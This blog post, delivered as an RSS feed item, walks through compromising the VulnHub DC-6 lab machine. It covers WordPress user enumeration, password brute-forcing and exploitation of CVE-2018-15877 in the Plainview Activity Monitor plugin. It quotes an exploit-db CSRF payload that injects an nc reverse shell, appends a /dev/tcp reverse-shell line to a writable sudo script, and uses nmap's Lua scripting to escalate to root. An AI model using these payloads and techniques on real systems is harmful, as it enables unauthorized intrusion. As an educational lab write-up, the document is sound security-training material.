<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>nmap on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/nmap/</link>
    <description>Recent content in nmap on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 30 May 2021 21:47:03 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/nmap/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - DC-6</title>
      <link>https://fahmifj.github.io/vulnhub/dc6/</link>
      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/vulnhub/dc6/</guid>
      <description>DC-6 starts off by enumerating usernames from a WordPress website and use a brute-force attack against it to log into the admin panel.</description>
      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website and use a brute-force attack against it to log into the admin panel. One of the plugin used by the site is vulnerable to command injection, which can be exploited to gain a foothold on the system. Enumerating the home directory reveals a to-do note containing a set of user credentials. The user has <code>sudo</code> permissions on a writable backup script and on <code>nmap</code>, allowing me to escalate to the next user then straight to root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>WordPress enumeration and WP plugin exploitation</li>
<li>Sudo exploitation on <code>nmap</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>WPScan</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ arp-scan --interface eth0 <span class="s1">&#39;192.168.2.0/24&#39;</span> <span class="p">|</span> tee scans/00-arp-scan-dc6
</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
</span></span><span class="line"><span class="cl">Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
</span></span><span class="line"><span class="cl">192.168.2.2     0a:00:27:00:00:07       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
</span></span></code></pre></div><h3 id="nmap">Nmap</h3>
<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span class="s1">&#39;192.168.2.104&#39;</span> -v
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://wordy/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
</span></span></code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">192.168.1.104   wordy
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page clearly states that it&rsquo;s a WordPress site.</p>
<p><div class="img-container"><img src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  /></div>
</p>
<p>The text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
<p>I  did a <code>gobuster</code> scan but the results didn&rsquo;t contain anything interesting.</p>
<h4 id="enumeration-with-nmap">Enumeration with Nmap</h4>
<p><code>nmap</code> script scan found some usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ nmap -p <span class="m">80</span> --script <span class="s2">&#34;http-wordpress*&#34;</span> wordy
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-11 23:13 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> wordy <span class="o">(</span>192.168.2.104<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: WordPress version: 5.1.1
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-wordpress-users: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username found: admin
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username found: graham
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username found: mark
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username found: sarah
</span></span><span class="line"><span class="cl"><span class="p">|</span> Username found: jens
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Search stopped at ID <span class="c1">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.48 seconds
</span></span></code></pre></div><h4 id="enumeration-with-wpscan">Enumeration with WPScan</h4>
<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> plainview-activity-monitor
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2018-08-26T15:08:00.000Z
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is <span class="m">20180826</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Directory listing is enabled
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: Plainview Activity Monitor &lt;<span class="o">=</span> <span class="m">20161228</span> - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: <span class="m">20180826</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2018-15877
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: <span class="m">20161228</span> <span class="o">(</span>50% confidence<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> user-role-editor
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://wordy/wp-content/plugins/user-role-editor/
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2021-04-05T02:38:00.000Z
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 4.59
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/, status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: User Role Editor &lt;<span class="o">=</span> 4.24 - Privilege Escalation
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: 4.25
</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
</span></span><span class="line"><span class="cl"> <span class="p">|</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: 4.24 <span class="o">(</span>80% confidence<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
<h4 id="brute-force">Brute-force</h4>
<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  /></div>
</p>
<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ cat /usr/share/wordlists/rockyou.txt <span class="p">|</span> grep k01 &gt; passwords.txt
</span></span><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
</span></span></code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="wp-dashboard">WP Dashboard</h4>
<p>With the credentials I obtained, I can login into the admin panel.</p>
<p><div class="img-container"><img src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  /></div>
</p>
<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--  Wordpress Plainview Activity Monitor RCE
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] Version: 20161228 and possibly prior
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] Author: LydA(c)ric LEFEBVRE
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] CVE-ID: CVE-2018-15877
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
</span></span></span><span class="line"><span class="cl"><span class="c">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
</span></span></span><span class="line"><span class="cl"><span class="c">  --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;ip&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;lookup&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Lookup&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
<p><div class="img-container"><img src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  /></div>
</p>
<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
<p>Here is with command pipe.</p>
<p><div class="img-container"><img src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  /></div>
</p>
<p>And this one by stacking commands with semicolon.</p>
<p><div class="img-container"><img src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  /></div>
</p>
<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">$do_something</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;dig </span><span class="si">$ip</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-graham">Shell as graham</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>The home directory is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
</span></span><span class="line"><span class="cl">find /home 2&gt;/dev/null
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/home/jens/backups.sh
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">/home/mark/stuff/things-to-do.txt
</span></span><span class="line"><span class="cl">....
</span></span></code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
</span></span><span class="line"><span class="cl">ls -l /home/jens/backups.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> jens devs <span class="m">50</span> Apr <span class="m">26</span>  <span class="m">2019</span> /home/jens/backups.sh
</span></span><span class="line"><span class="cl">www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
</span></span><span class="line"><span class="cl">cat /home/jens/backups.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">tar -czf backups.tar.gz /var/www/html
</span></span></code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
</span></span><span class="line"><span class="cl">cat /home/mark/stuff/things-to-do.txt
</span></span><span class="line"><span class="cl">Things to <span class="k">do</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- Restore full functionality <span class="k">for</span> the hyperdrive <span class="o">(</span>need to speak to Jens<span class="o">)</span>
</span></span><span class="line"><span class="cl">- Buy present <span class="k">for</span> Sarah<span class="s1">&#39;s farewell party
</span></span></span><span class="line"><span class="cl"><span class="s1">- Add new user: graham - GSo7isUM1D4 - done
</span></span></span><span class="line"><span class="cl"><span class="s1">- Apply for the OSCP course
</span></span></span><span class="line"><span class="cl"><span class="s1">- Buy new laptop for Sarah&#39;</span>s replacement
</span></span></code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-6» «192.168.43.234» 
</span></span><span class="line"><span class="cl">$ ssh graham@192.168.2.104
</span></span><span class="line"><span class="cl">graham@192.168.2.104<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Linux dc-6 4.9.0-8-amd64 <span class="c1">#1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">graham@dc-6:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>graham<span class="o">)</span>,1005<span class="o">(</span>devs<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">graham@dc-6:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> graham on dc-6:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User graham may run the following commands on dc-6:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>jens<span class="o">)</span> NOPASSWD: /home/jens/backups.sh
</span></span><span class="line"><span class="cl">graham@dc-6:~$ cat /home/jens/backups.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">tar -czf backups.tar.gz /var/www/html
</span></span><span class="line"><span class="cl">graham@dc-6:~$ ls -l /home/jens/backups.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> jens devs <span class="m">50</span> Apr <span class="m">26</span>  <span class="m">2019</span> /home/jens/backups.sh
</span></span></code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">graham@dc-6:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  /></div>
</p>
<h3 id="shell-as--root">Shell as  root</h3>
<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jens@dc-6:/home/graham$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jens on dc-6:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User jens may run the following commands on dc-6:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
</span></span></code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jens@dc-6:/home/graham$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
</span></span><span class="line"><span class="cl">jens@dc-6:/home/graham$ <span class="nb">echo</span> <span class="s1">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">jens@dc-6:/home/graham$ sudo nmap --script<span class="o">=</span><span class="nv">$TF</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  /></div>
</p>
<p>And here is the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@dc-6:~# cat theflag.txt 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Yb        dP <span class="m">888888</span> <span class="m">88</span>     <span class="m">88</span>         8888b.   dP<span class="s2">&#34;Yb  88b 88 888888 d8b 
</span></span></span><span class="line"><span class="cl"><span class="s2"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
</span></span></span><span class="line"><span class="cl"><span class="s2">  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;</span><span class="err">&#39;</span> 
</span></span><span class="line"><span class="cl">   YP  YP    <span class="m">888888</span> 88ood8 88ood8     8888Y<span class="s2">&#34;   YbodP  88  Y8 888888 (8) 
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Congratulations!!!
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
</span></span></span><span class="line"><span class="cl"><span class="s2">who have provided feedback, and who have taken time to complete these little
</span></span></span><span class="line"><span class="cl"><span class="s2">challenges.
</span></span></span><span class="line"><span class="cl"><span class="s2">
